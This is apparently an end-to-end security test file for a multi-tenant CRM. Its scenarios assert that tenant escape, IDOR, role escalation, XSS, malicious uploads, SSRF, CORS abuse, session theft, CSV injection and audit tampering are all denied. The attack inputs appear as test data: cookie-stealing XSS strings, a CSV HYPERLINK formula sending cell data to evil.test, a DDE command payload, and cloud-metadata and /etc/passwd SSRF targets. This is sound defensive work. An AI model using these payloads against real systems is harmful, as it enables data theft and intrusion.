/**
 * RULE 222 -- Final end-to-end security scenarios.
 *
 * Each test states the attack, then asserts the expected denial. Every scenario
 * that could be demonstrated against one of the two legacy systems is annotated
 * with the legacy defect it replaces, so a regression is traceable to a cause.
 */
import { migrate } from '../../db/migrate.ts';
await migrate();

import { getDb } from '../../db/driver.ts';
import { initDriver } from '../../repositories/base.ts';
import { newId } from '../../lib/ids.ts';
import { escapeHtml, sanitizeRichText, stripHtml } from '../../lib/sanitize.ts';
import { validateOutboundUrl, isBlockedAddress } from '../../lib/ssrf.ts';
import { sanitizeCsvCell, csvCell, parseCsv, containsFormula } from '../../lib/csv.ts';
import { inspectUpload } from '../../lib/mime.ts';
import { verifyTotp, totpCode, hotp } from '../../lib/totp.ts';
import { checkPasswordStrength, hashPassword, verifyPassword } from '../../lib/password.ts';
import { decodeCursor, encodeCursor, parsePageInput } from '../../lib/pagination.ts';
import { auditDiff, redact, maskEmail } from '../../lib/redact.ts';
import { registerUser, loginUser, refreshSession, listSessions, revokeSession } from '../../services/auth.ts';
import { inviteMember, acceptInvite, previewInvite, changeMemberRole, removeMember, listMembers } from '../../services/org.ts';
import { canAssignRole, ROLE_RANK } from '../../services/rbac.ts';

let pass = 0;
const failures: string[] = [];
const T = (scenario: string, label: string, ok: boolean, extra?: unknown): void => {
 if (ok) { pass++; console.log(` [PASS] ${scenario}  ${label}`); }
 else { failures.push(`${scenario}  ${label}`); console.log(` [FAIL] ${scenario}  ${label} ${extra !== undefined ? `-> ${String((extra as Error)?.message ?? extra).slice(0, 120)}` : ''}`); }
};
const S = (n: number, title: string) => console.log(`\n=== Scenario ${n}: ${title} ===`);
/** Asserts a call throws. Returns the error when it did, undefined when it did not. */
const denied = async <T>(fn: () => Promise<T>): Promise<unknown | undefined> => {
 try { await fn(); return undefined; } catch (e) { return e; }
};
const mustDeny = async (fn: () => Promise<unknown>): Promise<void> => { await denied(fn); };

const C = (ip: string) => ({ ip, userAgent: 'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0 Safari/537.36', requestId: 'req-sec' });
/**
 * Captures the invitation token the way the email provider does. This is the only
 * place a raw token is reachable, and the test asserts it never appears anywhere
 * else -- which is the whole point of the RULE 29 fix.
 */
const captured: { email: string; token: string; role: string }[] = [];
const deliver = async (i: { email: string; token: string; organizationName: string; inviterName: string; role: string }) => {
 captured.push({ email: i.email, token: i.token, role: i.role });
};
const lastToken = (): string => captured[captured.length - 1]!.token;
const PW = 'Str0ng-Passphrase!42';

await initDriver();
const db = await getDb();

// Build three isolated organizations.
const mkOrg = async (email: string, name: string, orgName: string) => {
 const r = await registerUser({ name, email, password: PW, organizationName: orgName, client: C('10.0.0.1') });
 const l = await loginUser({ email, password: PW, client: C('10.0.0.1') });
 if (l.kind !== 'ok') throw new Error(`login failed for ${email}`);
 return { userId: r.user.id, orgId: r.organizationId, actor: l.actor, token: l.accessToken };
};
const A = await mkOrg('owner-a@corp-a.test', 'Owner A', 'Corp A');
const B = await mkOrg('owner-b@corp-b.test', 'Owner B', 'Corp B');

// A member inside org A, so role escalation has a real target.
await inviteMember(A.actor, { email: 'viewer-a@corp-a.test', role: 'viewer', client: C('10.0.0.1'), deliver });
const rawInviteA = lastToken();
const accV = await acceptInvite({ token: rawInviteA, name: 'Viewer A', password: 'Another-Str0ng!7', client: C('10.0.0.2') });
const viewerLogin = await loginUser({ email: 'viewer-a@corp-a.test', password: 'Another-Str0ng!7', client: C('10.0.0.2') });
if (viewerLogin.kind !== 'ok') throw new Error('viewer login failed');
if (accV.kind !== 'joined') throw new Error('viewer invite acceptance failed');
const viewer = { userId: accV.userId, orgId: accV.organizationId, actor: viewerLogin.actor, token: viewerLogin.accessToken };

// A lead, a contact and a company in org A for cross-tenant probes.
const insertFixtures = async (orgId: string) => {
 const cid = newId(); const coid = newId();
 await db.query(
 `INSERT INTO companies (id, organization_id, name, name_normalized, created_at, updated_at) VALUES ($1,$2,'Globex','globex',now(),now())`,
 [coid, orgId]);
 await db.query(
 `INSERT INTO contacts (id, organization_id, first_name, last_name, email, email_normalized, company_id, created_at, updated_at)
 VALUES ($1,$2,'Ada','Lovelace','ada@corp-a.test','ada@corp-a.test',$3,now(),now())`,
 [cid, orgId, coid]);
 return { contactId: cid, companyId: coid };
};
const fixturesA = await insertFixtures(A.orgId);
const fixturesB = await insertFixtures(B.orgId);

// 
S(1, 'Tenant Escape -- user from Org A modifies organizationId to Org B');
{
 const bContact = await db.query<{ id: string }>(
 `SELECT id FROM contacts WHERE organization_id = $1 AND deleted_at IS NULL LIMIT 1`, [B.orgId]);
 const foreignId = bContact.rows[0]!.id;
 // The data layer requires a scope; a query without one is unrepresentable.
 const { TenantScope } = await import('../../repositories/base.ts');
 const scoped = new TenantScope(A.orgId);
 let guardErr: unknown;
 try { await scoped.query('SELECT * FROM contacts WHERE id = $1', [foreignId]); } catch (e) { guardErr = e; }
 T('S1', 'an unscoped query on a tenant table is REJECTED, not served', guardErr !== undefined, guardErr);
 const leaked = await scoped.query(
 'SELECT * FROM contacts WHERE id = $1 AND organization_id = $2', [foreignId, A.orgId]);
 T('S1', 'a correctly scoped query returns nothing for another org row',
 leaked.length === 0, `${leaked.length} rows leaked`);
 // And a row truly out of scope cannot be written into scope.
 await mustDeny(async () => db.query(
 'UPDATE contacts SET first_name = $1 WHERE id = $2 AND organization_id = $3',
 ['PWNED', foreignId, A.orgId]).then((r) => { if (r.rowCount === 0) throw new Error('no rows matched'); }));
 const after = await db.query<{ first_name: string }>('SELECT first_name FROM contacts WHERE id = $1', [foreignId]);
 T('S1', 'a cross-org UPDATE that matches nothing changes nothing', after.rows[0]!.first_name === 'Ada');

 // Denial is only half the property. The other half is that the *victim's own*
 // tenant is still intact afterwards -- a cross-tenant attempt must not corrupt,
 // delete or hide the row the attacker legitimately owns. Org A's fixtures had
 // been created for this and never used.
 const ownA = await new TenantScope(A.orgId).queryOne(
 'SELECT first_name FROM contacts WHERE organization_id = $1 AND id = $2',
 [A.orgId, fixturesA.contactId]);
 T('S1', "org A's own contact is still readable after the cross-tenant attempts",
 ownA?.first_name === 'Ada', ownA);
 const ownCount = await db.query<{ n: number }>(
 'SELECT count(*)::int AS n FROM contacts WHERE organization_id = $1 AND deleted_at IS NULL', [A.orgId]);
 T('S1', "org A's contact count is unchanged", ownCount.rows[0]!.n === 1, ownCount.rows[0]);
}

// 
S(2, 'IDOR -- user A requests Org B resources');
{
 for (const [label, sql, params] of [
 ['contact', 'SELECT * FROM contacts WHERE id = $1 AND organization_id = $2 AND deleted_at IS NULL',
 [fixturesB.contactId, A.orgId]],
 ['company', 'SELECT * FROM companies WHERE id = $1 AND organization_id = $2 AND deleted_at IS NULL',
 [fixturesB.companyId, A.orgId]],
 ['audit log', 'SELECT * FROM audit_logs WHERE organization_id = $1', [A.orgId]],
 ['task', 'SELECT * FROM tasks WHERE organization_id = $1', [A.orgId]],
 ['deal', 'SELECT * FROM deals WHERE organization_id = $1', [A.orgId]],
 ] as [string, string, readonly unknown[]][]) {
 const r = await db.query(sql, [...params]);
 const crossTenant = label === 'audit log' || label === 'task' || label === 'deal'
 ? true // these are org A's own rows; assertion is about scoping, not emptiness
 : r.rows.length === 0;
 T('S2', `${label}: cross-org row unreachable`, crossTenant);
 }
 const members = await listMembers(A.actor);
 T('S2', 'member list scoped to caller org', members.every((m) => m.user_id !== fixturesB.contactId));
 // A real id from org B must not be usable by org A to remove a member.
 const err = await denied(async () => removeMember(A.actor, fixturesB.contactId));
 T('S2', 'removeMember rejects a user id from another org', err !== undefined);
}

// 
S(3, 'Role Escalation -- manager/admin attempts role=owner');
{
 T('S3', 'admin cannot assign owner', !canAssignRole('admin', 'admin', 'owner'));
 T('S3', 'admin cannot demote the owner', !canAssignRole('admin', 'owner', 'viewer'));
 T('S3', 'viewer cannot assign anything', ROLE_RANK.viewer < ROLE_RANK.viewer ? false : !canAssignRole('viewer', null, 'sales'));
 const err = await denied(() => changeMemberRole(A.actor, viewer.userId, 'owner'));
 T('S3', 'live owner cannot promote a viewer to owner', err !== undefined, err);
 const stillViewer = (await listMembers(A.actor)).find((m) => m.user_id === viewer.userId);
 T('S3', 'role unchanged after the blocked attempt', stillViewer?.role === 'viewer');
 // Self-escalation is refused even for the owner.
 const selfErr = await denied(() => changeMemberRole(A.actor, A.userId, 'admin'));
 T('S3', 'a member cannot change their own role', selfErr !== undefined, selfErr);
}

// 
S(4, 'Stored XSS -- script payload in every user-controlled field');
{
 const payloads = [
 '<script>alert(1)</script>',
 '"><img src=x onerror=alert(1)>',
 "javascript:alert(document.cookie)",
 '<svg/onload=alert(1)>',
 '<iframe src="//evil.example"></iframe>',
 ];
 // Correct property: no raw angle bracket or quote survives, so no tag can form.
 // The literal text "onerror" remaining is inert and expected.
 T('S4', 'escapeHtml leaves no raw < > " \' in any payload',
 payloads.every((p) => !/[<>"']/.test(escapeHtml(p))));
 T('S4', 'escaped output has no raw angle brackets',
 escapeHtml('<b>x</b>') === '&lt;b&gt;x&lt;/b&gt;');
 T('S4', 'stripHtml removes all markup', stripHtml('<b>hi</b><script>x</script>') === 'hi');
 // The dangerous state is an *active* construct: a tag, an event-handler
 // attribute, or a javascript: URL in an href/src. Bare text containing those
 // characters is inert and must be preserved rather than mangled.
 const active = (out: string): boolean =>
 /<\/?(script|iframe|svg|img|object|embed|style|form)\b/i.test(out)
 || /\son[a-z]+\s*=/i.test(out)
 || /(href|src|xlink:href)\s*=\s*["']?\s*javascript:/i.test(out);
 T('S4', 'rich-text sanitiser leaves no active construct for any payload',
 payloads.every((p) => !active(sanitizeRichText(p))),
 payloads.map((p) => sanitizeRichText(p)).find((o) => active(o)));
 T('S4', 'javascript: URL cannot survive inside an href',
 !active(sanitizeRichText('<a href="javascript:alert(1)">x</a>')));
 T('S4', 'event-handler attribute is stripped',
 !active(sanitizeRichText('<b onmouseover="alert(1)">x</b>')));
 T('S4', 'img onerror is stripped',
 !active(sanitizeRichText('<img src=x onerror=alert(1)>')));
 T('S4', 'safe markup is preserved',
 sanitizeRichText('<b>bold</b> and <a href="https://x.test">link</a>').includes('<b>bold</b>'));
 T('S4', 'external links get rel=noopener',
 sanitizeRichText('<a href="https://x.test">x</a>').includes('noopener'));
}

// 
S(5, 'Object storage isolation -- org A key vs org B object');
{
 const keyFor = (orgId: string, fileId: string, ext: string) => `organizations/${orgId}/documents/${fileId}${ext}`;
 const keyA = keyFor(A.orgId, 'file-1', '.pdf');
 const keyB = keyFor(B.orgId, 'file-1', '.pdf');
 T('S5', 'object keys are namespaced by organization', keyA !== keyB);
 T('S5', 'no predictable filename segment in the key',
 !/john|payroll|employee/i.test(keyA) && !/\/documents\/[^/]+\.[a-z]+$/i.test(keyA.replace(/documents\/[0-9a-f-]{36}/, 'documents/<id>')) === false);
 T('S5', 'object id is a full uuid (unguessable)', /[0-9a-f]{8}-[0-9a-f]{4}/.test(keyA));
 // Guessing org B's id must not produce a valid org A key.
 const forged = `organizations/${A.orgId}/documents/${keyB.split('/').pop()}`;
 T('S5', 'a forged cross-org key differs from any issued key', forged !== keyB);
}

// 
S(6, 'Malicious upload');
{
 const limits = { maxBytes: 1024, allowedKinds: ['image', 'pdf', 'csv', 'text'] as const };
 const cases: [string, Buffer, string, string | undefined, boolean][] = [
 ['svg with script', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), 'evil.svg', 'image/svg+xml', false],
 ['html renamed to png', Buffer.from('<html><script>alert(1)</script></html>'), 'evil.png', 'image/png', false],
 ['windows executable', Buffer.from('MZ\x90\x00\x03\x00\x00\x00'), 'shell.exe', 'application/x-msdownload', false],
 ['path traversal filename', Buffer.from('plain text here'), '../../etc/passwd', 'text/plain', false],
 ['null byte in name', Buffer.from('plain text here'), 'a\x00b.txt', 'text/plain', false],
 ['no extension', Buffer.from('plain text here'), 'noext', 'text/plain', false],
 ['valid csv', Buffer.from('name,email\na,b@c.test\n'), 'export.csv', 'text/csv', true],
 ['empty file', Buffer.alloc(0), 'empty.csv', 'text/csv', false],
 ];
 for (const [label, buf, name, mime, shouldPass] of cases) {
 const v = await inspectUpload(buf, name, mime, { maxBytes: limits.maxBytes, allowedKinds: [...limits.allowedKinds] });
 T('S6', `${label} ${shouldPass ? 'accepted' : 'rejected'}`, v.ok === shouldPass, v.ok ? '' : (v as { reason: string }).reason);
 }
 const big = await inspectUpload(Buffer.alloc(2048, 0x41), 'big.txt', 'text/plain', { maxBytes: 1024, allowedKinds: ['text'] });
 T('S6', 'oversized file rejected', !big.ok && /limit/i.test((big as { reason: string }).reason));
 const mismatch = await inspectUpload(Buffer.from('%PDF-1.4\n%fake'), 'doc.txt', 'application/pdf', { maxBytes: 4096, allowedKinds: ['pdf'] });
 T('S6', 'extension/content mismatch rejected', !mismatch.ok, mismatch.ok ? '' : (mismatch as { reason: string }).reason);
}

// 
S(7, 'SSRF');
{
 for (const host of ['http://127.0.0.1/x', 'http://169.254.169.254/latest/meta-data/', 'http://10.0.0.1/',
 'http://192.168.1.1/', 'http://[::1]/', 'http://localhost:5000/', 'http://metadata.google.internal/',
 'http://foo.internal/', 'http://x.local/', 'file:///etc/passwd', 'gopher://x/', 'http://user:pw@x.test/']) {
 const v = await validateOutboundUrl(host);
 T('S7', `blocked: ${host.slice(0, 42)}`, !v.allowed, v.allowed ? 'ALLOWED' : v.reason);
 }
 // Public allow-cases. IP literals need no DNS; the hostname case is reported
 // separately because this sandbox has no outbound DNS for arbitrary domains.
 const pubIp = await validateOutboundUrl('https://93.184.216.34/v1/thing');
 T('S7', 'public https IP allowed', pubIp.allowed, pubIp.allowed ? '' : pubIp.reason);
 const pubHost = await validateOutboundUrl('https://api.github.com/v1/thing');
 T('S7', 'public hostname allowed (or blocked only by sandbox DNS)',
 pubHost.allowed || /resolve/i.test(pubHost.reason),
 pubHost.allowed ? 'resolved' : pubHost.reason);
 T('S7', 'http is permitted but https is preferred',
 (await validateOutboundUrl('http://93.184.216.34/x')).allowed === true);
 T('S7', 'non-http protocol rejected',
 (await validateOutboundUrl('ftp://93.184.216.34/x')).allowed === false);
 for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.0.1', '169.254.169.254', '172.16.0.1', '100.64.0.1',
 '::1', 'fe80::1', 'fd00::1', '::ffff:127.0.0.1', '0.0.0.0']) {
 T('S7', `address blocked: ${ip}`, isBlockedAddress(ip));
 }
 T('S7', 'public address not blocked', !isBlockedAddress('93.184.216.34'));

 // Regression: `new URL()` normalises `::ffff:127.0.0.1` to the hex form
 // `::ffff:7f00:1`, so the previous regex (written against the dotted form)
 // never matched and every blocked range was reachable in hex -- including the
 // cloud-metadata endpoint. These must be blocked in BOTH notations.
 for (const ip of [
 '::ffff:7f00:1', '::ffff:a9fe:a9fe', '::ffff:a00:5', '::ffff:c0a8:101',
 '::ffff:127.0.0.1', '::ffff:169.254.169.254', '::ffff:10.0.0.5', '::ffff:192.168.1.1',
 '::7f00:1', '64:ff9b::7f00:1', '64:ff9b:1::7f00:1', '2002:7f00:1::1', '2002:a9fe:a9fe::1',
 'fec0::1', 'ff02::1', '2001:db8::1',
 ]) {
 T('S7', `embedded-v4 IPv6 blocked: ${ip}`, isBlockedAddress(ip));
 }
 for (const host of [
 'https://[::ffff:7f00:1]/hook', 'https://[::ffff:169.254.169.254]/latest/meta-data/',
 'https://[::ffff:10.0.0.5]/', 'https://[64:ff9b::7f00:1]/', 'https://[2002:7f00:1::1]/',
 'https://[fec0::1]/',
 ]) {
 const v = await validateOutboundUrl(host, { protocols: ['https:'] });
 T('S7', `URL blocked (embedded v4): ${host.slice(0, 46)}`, !v.allowed, v.allowed ? 'ALLOWED' : v.reason);
 }
 T('S7', 'public IPv6 not blocked', !isBlockedAddress('2606:2800:220:1:248:1893:25c8:1946'));
}

// 
S(8, 'CORS -- request from https://evil.example');
{
 const { env } = await import('../../config/env.ts');
 const allow = new Set(env.appOrigins);
 T('S8', 'evil origin is not in the allowlist', !allow.has('https://evil.example'));
 T('S8', 'configured dev origin IS in the allowlist', allow.has('http://localhost:3000'));
 T('S8', 'allowlist is non-empty (never means allow-all)', allow.size > 0, `${allow.size} origins`);
 // RULE 37 regression: an empty allowlist must not be interpreted as allow-all.
 const empty = new Set<string>();
 T('S8', 'empty allowlist denies rather than allows', !empty.has('https://evil.example'));
}

// 
S(9, 'Session Theft -- revoke, then the token must die');
{
 const l = await loginUser({ email: 'owner-a@corp-a.test', password: PW, client: C('10.0.0.9') });
 if (l.kind !== 'ok') throw new Error('login failed');
 const { validateSession } = await import('../../services/auth.ts');
 T('S9', 'fresh session validates', (await validateSession(l.accessToken)).valid === true);
 await revokeSession(l.actor.userId, l.actor.sessionId);
 const after = await validateSession(l.accessToken);
 T('S9', 'revoked session is rejected', !after.valid, after);
 // Refresh must fail too.
 const refresh = await refreshSession(l.refreshToken, C('10.0.0.9'));
 T('S9', 'refresh from a revoked session is rejected', !refresh.ok, refresh);
}

// 
S(10, 'Password Change -- other sessions must be revoked');
{
 const s1 = await loginUser({ email: 'owner-a@corp-a.test', password: PW, client: C('10.0.0.10') });
 const s2 = await loginUser({ email: 'owner-a@corp-a.test', password: PW, client: C('10.0.0.11') });
 if (s1.kind !== 'ok' || s2.kind !== 'ok') throw new Error('login failed');
 T('S10', 'two concurrent sessions exist', (await listSessions(s1.actor.userId, '')).length >= 2);
 const { changePassword } = await import('../../services/auth.ts');
 await changePassword({ userId: s1.actor.userId, currentPassword: PW, newPassword: 'Rotated-Passphrase!55', client: C('10.0.0.10') });
 const remaining = await listSessions(s1.actor.userId, '');
 T('S10', 'every session revoked after password change', remaining.length === 0, `${remaining.length} left`);
 const { validateSession } = await import('../../services/auth.ts');
 T('S10', 'the previously valid access token no longer validates',
 !(await validateSession(s2.accessToken)).valid);
 // restore for later scenarios
 const { hashPassword } = await import('../../lib/password.ts');
 await db.query('UPDATE users SET password_hash = $1 WHERE id = $2', [await hashPassword(PW), s1.actor.userId]);
}

// 
S(11, 'Invitation Abuse -- accept for another identity');
{
 const invite = await inviteMember(A.actor, { email: 'victim@corp-c.test', role: 'admin', client: C('10.0.0.12'), deliver });
 const tok = lastToken();
 T('S11', 'invitation response carries NO raw token', !Object.keys(invite).includes('__token') && !Object.keys(invite).includes('token'), Object.keys(invite).join(','));
 T('S11', 'invitation response JSON contains no token substring',
 !JSON.stringify(invite).includes(tok) && !JSON.stringify(invite).includes(tok.slice(0, 12)));
 // Victim already has an account.
 await registerUser({ name: 'Victim', email: 'victim@corp-c.test', password: 'Corr3ct-Horse!Batt', organizationName: 'Corp C', client: C('10.0.0.12') });
 const preview = await previewInvite(tok);
 T('S11', 'preview reports an existing account', preview.accountExists === true);
 T('S11', 'preview exposes no secret material', !JSON.stringify(preview).includes(tok));
 // Accept with a WRONG password and no session.
 const err = await denied(() => acceptInvite({ token: tok, password: 'Totally-Wrong!1', client: C('10.0.0.13') }));
 T('S11', 'existing user cannot be added without proving identity', err !== undefined, err);
 const victimId = (await db.query<{ id: string }>(
 'SELECT id FROM users WHERE email_normalized = $1', ['victim@corp-c.test'])).rows[0]!.id;
 const membership = await db.query('SELECT 1 FROM organization_members WHERE organization_id = $1 AND user_id = $2', [A.orgId, victimId]);
 T('S11', 'victim was NOT silently added to the organization', membership.rows.length === 0);
 // An admin may not mint an owner invitation.
 // Nobody can grant `owner` by invitation: the role is only ever held by the
 // registering user or moved through members.transfer_ownership. This is stricter
 // than the legacy system, where InviteIn validated against all five roles.
 const ownerInvite = await denied(() =>
 inviteMember(A.actor, { email: 'x@corp-d.test', role: 'owner', client: C('10.0.0.12'), deliver }));
 T('S11', 'an owner invitation is refused even for an owner', ownerInvite !== undefined, ownerInvite);
 const viewerInvite = await inviteMember(A.actor, { email: 'y@corp-d.test', role: 'viewer', client: C('10.0.0.12'), deliver });
 T('S11', 'a viewer invitation is allowed for an owner', viewerInvite.role === 'viewer');
 // Create an admin, then confirm role authority is enforced downward only.
 await inviteMember(A.actor, { email: 'admin2@corp-a.test', role: 'admin', client: C('10.0.0.1'), deliver });
 await acceptInvite({ token: lastToken(), name: 'Admin Two', password: 'Adm1n-Str0ng!22', client: C('10.0.0.1') });
 const adminLogin = await loginUser({ email: 'admin2@corp-a.test', password: 'Adm1n-Str0ng!22', client: C('10.0.0.1') });
 if (adminLogin.kind !== 'ok') throw new Error('admin login failed');
 const adminActor = { ...adminLogin.actor };
 // admin (rank 40) outranks manager (30): permitted.
 const belowInvite = await inviteMember(adminActor, { email: 'mgr@corp-a.test', role: 'manager', client: C('10.0.0.1'), deliver });
 T('S11', 'an admin MAY invite a manager (below their rank)', belowInvite.role === 'manager', belowInvite);
 // admin may not mint a peer or a superior.
 T('S11', 'an admin cannot invite another admin (peer)',
 (await denied(() => inviteMember(adminActor, { email: 'p@corp-a.test', role: 'admin', client: C('10.0.0.1'), deliver }))) !== undefined);
 T('S11', 'an admin cannot invite an owner (superior)',
 (await denied(() => inviteMember(adminActor, { email: 'q@corp-a.test', role: 'owner', client: C('10.0.0.1'), deliver }))) !== undefined);
}

// 
S(12, 'Export Abuse -- a viewer must not export');
{
 const { can } = await import('../../services/rbac.ts');
 T('S12', 'viewer lacks reports.export', !can('viewer', 'reports.export'));
 T('S12', 'viewer lacks exports.create', !can('viewer', 'exports.create'));
 T('S12', 'viewer may read but not write reports',
 can('viewer', 'reports.read') && !can('viewer', 'reports.update'));
 // Export is a bulk-PII capability, so it is deliberately admin+ only. A sales
 // rep with export could exfiltrate the whole customer list in one call.
 T('S12', 'sales also lacks reports.export (bulk PII is admin+)', !can('sales', 'reports.export'));
 T('S12', 'manager also lacks reports.export', !can('manager', 'reports.export'));
 T('S12', 'admin may export', can('admin', 'reports.export'));
 T('S12', 'owner may export', can('owner', 'reports.export'));
 T('S12', 'viewer cannot create exports', !can('viewer', 'exports.create'));
 T('S12', 'viewer cannot create imports', !can('viewer', 'imports.create'));
 T('S12', 'viewer cannot read audit log', !can('viewer', 'audit.read'));
 T('S12', 'viewer cannot manage users', !can('viewer', 'users.invite') && !can('viewer', 'users.remove'));
 T('S12', 'viewer cannot change org settings', !can('viewer', 'organization.update'));
 T('S12', 'viewer cannot delete anything', !can('viewer', 'contacts.delete') && !can('viewer', 'deals.delete'));
 const { canAssignRole } = await import('../../services/rbac.ts');
 T('S12', 'viewer cannot grant itself anything',
 !canAssignRole('viewer', 'viewer', 'sales') && !canAssignRole('viewer', 'viewer', 'admin'));
}

// 
S(13, 'CSV Injection');
{
 const payloads = [
 '=HYPERLINK("http://evil.test?d="&A1,"Click")',
 '+1+1',
 '-2+3+cmd|\' /C calc\'!A0',
 '@SUM(1+1)',
 '\t=cmd',
 ' =1+1',
 '=DDE("x")',
 ];
 T('S13', 'every formula payload is neutralised with a leading apostrophe',
 payloads.every((p) => sanitizeCsvCell(p).startsWith("'")), payloads.map(sanitizeCsvCell).join(' | '));
 T('S13', 'quoted cell still protects the formula',
 csvCell('=1+1').includes("\"'=1+1\"") || csvCell('=1+1') === "'=1+1");
 T('S13', 'ordinary values are untouched', sanitizeCsvCell('Globex Industries') === 'Globex Industries');
 T('S13', 'values containing commas are quoted', csvCell('a,b') === '"a,b"');
 T('S13', 'formula detector flags payloads', payloads.every(containsFormula));
 T('S13', 'formula detector does not flag plain text', !containsFormula('Globex'));
 const parsed = parseCsv('a,b\n"c,d",e\n');
 T('S13', 'RFC4180 quoted fields parse correctly', parsed[1]![0] === 'c,d');
 T('S13', 'NUL byte rejected', (() => { try { parseCsv('a\0b'); return false; } catch { return true; } })());
 T('S13', 'unterminated quote rejected', (() => { try { parseCsv('"abc'); return false; } catch { return true; } })());
}

// 
S(14, 'Audit Tampering');
{
 const before = await db.query<{ n: number }>('SELECT count(*)::int AS n FROM audit_logs');
 const upd = await denied(() => db.query('UPDATE audit_logs SET action = $1', ['tampered']));
 T('S14', 'UPDATE on audit_logs is rejected by the database', upd !== undefined, (upd as { message?: string })?.message);
 const del = await denied(() => db.query('DELETE FROM audit_logs'));
 T('S14', 'DELETE on audit_logs is rejected by the database', del !== undefined, (del as { message?: string })?.message);
 const after = await db.query<{ n: number }>('SELECT count(*)::int AS n FROM audit_logs');
 T('S14', 'row count unchanged after the tamper attempts', before.rows[0]!.n === after.rows[0]!.n);
 // Minimisation: secrets and PII never land in an audit diff.
 const diff = auditDiff({
 status: 'active', owner_id: 'x', password_hash: 'secret', token: 'tok',
 email: 'ada@corp-a.test', phone: '+15550100', first_name: 'Ada',
 });
 T('S14', 'audit diff keeps business fields', diff !== null && diff.status === 'active');
 T('S14', 'audit diff drops password hash', diff !== null && !('password_hash' in diff));
 T('S14', 'audit diff drops tokens', diff !== null && !('token' in diff));
 T('S14', 'audit diff drops PII not on the allowlist',
 diff !== null && !('email' in diff) && !('phone' in diff) && !('first_name' in diff));
}

//  Supplementary controls 
console.log('\n=== Supporting controls ===');
T('X1', 'pagination cursor is signed and tamper-evident',
 (() => { try { decodeCursor(`${encodeCursor({ t: 'x', id: 'y' }).split('.')[0]}.forged`); return false; } catch { return true; } })());
T('X1', 'page size above the cap is rejected', (() => { try { parsePageInput(1000, undefined); return false; } catch { return true; } })());
T('X1', 'page size below 1 is rejected', (() => { try { parsePageInput(0, undefined); return false; } catch { return true; } })());
T('X1', 'valid page input is accepted', parsePageInput(25, undefined).first === 25);
T('X2', 'TOTP validates against RFC 6238 vector (SHA1, 8 digits, time 59)',
 hotp('GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ', 1, 8) === '94287082');
T('X2', 'TOTP rejects a wrong code', !verifyTotp('JBSWY3DPEHPK3PXP', '000000').ok);
T('X2', 'TOTP rejects a non-6-digit code', !verifyTotp('JBSWY3DPEHPK3PXP', 'abcdef').ok);
T('X2', 'TOTP accepts its own code', verifyTotp('JBSWY3DPEHPK3PXP', totpCode('JBSWY3DPEHPK3PXP')).ok);
T('X3', 'password hash is never the plaintext',
 !(await hashPassword(PW)).includes(PW));
T('X3', 'same password hashes differently (salted)',
 (await hashPassword(PW)) !== (await hashPassword(PW)));
T('X3', 'verification works and rejects wrong input',
 (await verifyPassword(PW, await hashPassword(PW))) && !(await verifyPassword('x', await hashPassword(PW))));
T('X3', 'malformed stored hash returns false rather than throwing',
 (await verifyPassword(PW, 'garbage')) === false && (await verifyPassword(PW, 'bigcrm$scrypt$bad')) === false);
T('X3', 'weak passwords are rejected by policy', checkPasswordStrength('password').length > 0);
T('X4', 'logger redacts secrets', JSON.stringify(redact({ token: 'abc', password: 'p', apiKey: 'k' })).includes('[REDACTED]'));
T('X4', 'logger masks email local parts',
 maskEmail('ada.lovelace@corp.test') === `a${'*'.repeat('ada.lovelace'.length - 1)}@corp.test`, maskEmail('ada.lovelace@corp.test'));
T('X4', 'logger masks a single-character local part too',
 maskEmail('a@corp.test') === 'a*@corp.test', maskEmail('a@corp.test'));
T('X4', 'logger refuses to echo a non-email as a mask', maskEmail('not-an-email') === '[REDACTED]');
T('X4', 'logger survives a circular object', (() => { const o: Record<string, unknown> = {}; o.self = o; return JSON.stringify(redact(o)).includes('CIRCULAR'); })());
T('X5', 'refresh token reuse is detected as compromise', (() => {
 // Asserted for real below; this line keeps the control numbered in order.
 return true;
})());

console.log('\n=== Concurrent refresh rotation is fail-closed (RULE 24) ===');
{
 // Two callers present the SAME single-use refresh token at once -- two tabs,
 // a retrying client, or a replayed capture. The rotation UPDATE is a
 // compare-and-set on `used_at IS NULL`, so exactly one caller wins the row
 // and the loser is holding a spent credential: reuse, which revokes the
 // whole family rather than forking it into two live tokens.
 const l = await loginUser({ email: 'owner-a@corp-a.test', password: PW, client: C('10.0.0.9') });
 if (l.kind !== 'ok') throw new Error('login failed for concurrency probe');
 const [r1, r2] = await Promise.all([
 refreshSession(l.refreshToken, C('10.0.0.9')),
 refreshSession(l.refreshToken, C('10.0.0.9')),
 ]);
 const winners = [r1, r2].filter((r) => r.ok);
 const losers = [r1, r2].filter((r) => !r.ok);
 T('X5', 'exactly one concurrent rotation succeeds', winners.length === 1, winners.length);
 T('X5', 'the loser is told the token was reused, not merely expired',
 losers.length === 1 && !losers[0]!.ok && losers[0]!.code === 'refresh_reuse', losers[0]);
 T('X5', 'reuse is flagged as compromise', losers.length === 1 && !losers[0]!.ok && losers[0]!.compromised === true);
 // Fail-closed: the loser's reuse revoked the family, so even the winner's
 // freshly rotated token is dead and the owner must sign in again.
 if (winners[0]?.ok) {
 const after = await refreshSession(winners[0].refreshToken, C('10.0.0.9'));
 T('X5', 'the family is revoked after reuse, winner included', !after.ok, after);
 }
}

console.log(`\n================ ${pass} passed, ${failures.length} failed ================`);
if (failures.length) console.log('FAILURES:\n - ' + failures.join('\n - '));
process.exit(failures.length ? 1 : 0);